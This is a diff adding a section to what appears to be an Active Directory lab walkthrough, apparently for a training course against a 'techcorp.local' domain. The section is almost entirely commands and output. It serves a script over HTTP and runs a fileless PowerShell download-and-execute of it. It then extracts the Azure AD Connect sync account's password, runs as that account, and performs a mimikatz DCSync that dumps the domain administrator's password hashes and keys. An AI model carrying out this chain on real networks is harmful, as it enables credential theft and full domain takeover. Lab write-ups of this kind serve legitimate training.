@@ -207,6 +207,142 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 ```
 ## Extract secrets
 
+From the attacker student machine launch SImpleHTTPServer in python:
 ```
+C:\AD\Tools>python -m SimpleHTTPServer 8989
+Serving HTTP on 0.0.0.0 port 8989 ...
+192.168.1.209 - - [28/Feb/2023 11:04:00] "GET /adconnect.ps1 HTTP/1.1" 200 -
+
 ```
 
+On the ad-connector machine load directly in memory fileless the following ADconnector script:
+
+```
+IEX(New-Object Net.webclient).DownloadString("http://192.168.100.17:8989/adconnect.ps1")
+IEX(New-Object Net.webclient).DownloadString("http://192.168.100.17:8989/adconnect.ps1")
+PS C:\Users\helpdeskadmin\Downloads> ADConnect
+ADConnect
+AD Connect Sync Credential Extract POC (@_xpn_)
+
+AD Connect Sync Credential Extract v2 (@_xpn_)
+        [ Updated to support new cryptokey storage method ]
+
+[*] Querying ADSync localdb (mms_server_configuration)
+[*] Querying ADSync localdb (mms_management_agent)
+[*] Using xp_cmdshell to run some Powershell as the service user
+[*] Credentials incoming...
+
+Domain: techcorp.local
+Username: MSOL_16fb75d0227d
+Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf
+```
+Using the stracted MSQL user credentials from adconnector on techcorp.local domain, from elevated privileges shell:
+
+```
+C:\Windows\system32>runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
+Enter the password for techcorp.local\MSOL_16fb75d0227d:
+Attempting to start cmd as user "techcorp.local\MSOL_16fb75d0227d" ...
+
+```
+This command spawn a new cmd with the Administrator premissions on the student machine and allow the attacker dump the techcorp administrator credentials with a dcsync attack using SafetyKatz:
+
+```
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local" "exit"
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local
+[DC] 'techcorp.local' will be the domain
+[DC] 'Techcorp-DC.techcorp.local' will be the DC server
+[DC] 'techcorp\administrator' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   :
+Password last change : 7/4/2019 2:01:32 AM
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: bc4cf9b751d196c4b6e1a2ba923ef33f
+    ntlm- 0: bc4cf9b751d196c4b6e1a2ba923ef33f
+    ntlm- 1: c87a64622a487061ab81e51cc711a34b
+    lm  - 0: 6ac43f8c5f2e6ddab0f85e76d711eab8
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f94f43f24957c86f1a2d359b7585b940
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TECHCORP.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
+      aes128_hmac       (4096) : 1470b3ca6afc4146399c177ab08c5d29
+      des_cbc_md5       (4096) : c198a4545e6d4c94
+    OldCredentials
+      aes256_hmac       (4096) : 9de1b687c149f44ccf5bb546d7c5a6eb47feab97bc34380ee54257024a43caf0
+      aes128_hmac       (4096) : f7996a1b81e251f7eb2cceda64f7a2ff
+      des_cbc_md5       (4096) : 386b3de03ecb62df
+
+* Primary:Kerberos *
+    Default Salt : TECHCORP.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : c198a4545e6d4c94
+    OldCredentials
+      des_cbc_md5       : 386b3de03ecb62df
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  f4e3c69dc427ef76903a65e2848b0f4c
+    02  bf5ea8567f6fd1ef7f257304278a6e52
+    03  b3ed9e4019c9c725ae929d0b73cbd852
+    04  f4e3c69dc427ef76903a65e2848b0f4c
+    05  5c0f8ba64238288eff440c01bbe81a5e
+    06  dcc7e5185c6c279b3d10b20af1994cbb
+    07  50e4e0f1db674508a890e22751797889
+    08  f0fd75f91cf2843531ff58d83a85b84e
+    09  bd49a7a6232f85a5b8d8edb68786032b
+    10  6aabbb1d7742272ceff856b907c5c9ba
+    11  3a21402317ce21660b2ccb899d783ea3
+    12  f0fd75f91cf2843531ff58d83a85b84e
+    13  04f3c03fd2e53ee67fbece68ce267134
+    14  9a08da7d88d88f8e3b307adee818cc6e
+    15  da942a6b569ef74ecb675359bc2784eb
+    16  f783eb704fa6677368309688a31efc97
+    17  2e4abf671ea3bba742e340f2b25a3970
+    18  e60715ae3f9dc9d75b3c4aabf36d7a30
+    19  f0d4e1439ff5452f1a0fffb97e04524e
+    20  816fb1f321fd9e6936bc86db53375242
+    21  4e29af591c5b9fc1837a19ec61433da9
+    22  e238e557513d21c02e67134fd5209e01
+    23  db8ad27d9ed2dc8fa35d3c546d896b60
+    24  2c89e15382d83a0e7007b916c5f21925
+    25  60b33decd4f178a2417b0dc9e776ad3e
+    26  55584de6c6a3c05c519cbbf35478bbfa
+    27  c790bb64ca16391e1e9b15c9cb0aad68
+    28  067ef368529b0ba16bcfd1276c306aea
+    29  438b45e36bd633e4bedbb3748f3d0c4d
+
+
+mimikatz(commandline) # exit
+Bye!
+
+```
